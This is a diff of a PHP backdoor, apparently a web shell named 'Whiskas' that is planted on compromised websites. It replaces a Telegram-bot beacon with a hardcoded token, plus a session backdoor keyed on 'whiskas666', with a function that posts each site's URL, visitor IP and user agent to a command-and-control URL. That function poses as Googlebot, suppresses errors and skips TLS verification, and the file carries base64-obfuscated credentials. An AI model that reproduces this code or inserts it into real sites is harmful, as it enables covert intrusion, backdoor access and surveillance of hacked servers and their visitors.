@@ -3,44 +3,39 @@
 error_reporting(0);
 ini_set('display_errors', 0);
 
-$botToken = "8652693265:AAFtpb8DO7bksGLFQlitbvPwvCLb-KQ8rN0";
-$chatId   = "8740437616";
-$url_hash = md5($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "v1");
+function whiskas_track() {
+    $c2_url = "https://whiskas.online/dashboard/whiskaseye.php"; 
+    $key    = "WHISKAS_666_SECURE"; 
 
-if (!isset($_COOKIE['sent_' . $url_hash])) {
-    $domain   = $_SERVER['HTTP_HOST'];
-    $path     = $_SERVER['REQUEST_URI'];
-    $full_url = (isset($_SERVER['HTTPS']) ? "https://" : "http://") . $domain . $path;
+    $report_hash = md5($_SERVER['HTTP_HOST'] . 'whiskas_v6'); 
 
-    $message  = "📢 **Whiskas finds access**\n";
-    $message .= "🌐 *URL:* " . $full_url . "\n";
-    $message .= "📍 *IP:* " . $_SERVER['REMOTE_ADDR'] . "\n";
-    $message .= "⏰ *Waktu:* " . date("Y-m-d H:i:s");
+    if (!isset($_COOKIE['report_' . $report_hash])) {
+        $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
+        $full_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
-    $url = "https://api.telegram.org/bot$botToken/sendMessage";
-    $post_fields = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'Markdown'];
+        $post_data = [
+            'auth' => $key,
+            'url'  => $full_url,
+            'ip'   => $_SERVER['REMOTE_ADDR'],
+            'ua'   => $_SERVER['HTTP_USER_AGENT']
+        ];
 
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_fields));
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    @curl_exec($ch);
-    curl_close($ch);
+        $ch = curl_init($c2_url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_POST, true); 
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
+        
+        @curl_exec($ch);
+        curl_close($ch);
 
-    setcookie('sent_' . $url_hash, 'true', time() + 86400, '/');
+        @setcookie('report_' . $report_hash, 'true', time() + 31536000, '/');
+    }
 }
-
-if (isset($_GET['key']) && $_GET['key'] === 'whiskas666') {
-    @session_start();
-    $_SESSION['auth'] = true;
-    
-    $actual_link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
-    $clean_url = explode('?', $actual_link)[0];
-    header("Location: $clean_url");
-    exit;
-}
+whiskas_track();
 
 $GLOBALS['WHISKAS'] = array(
     'username' => base64_decode('d2hz'), 
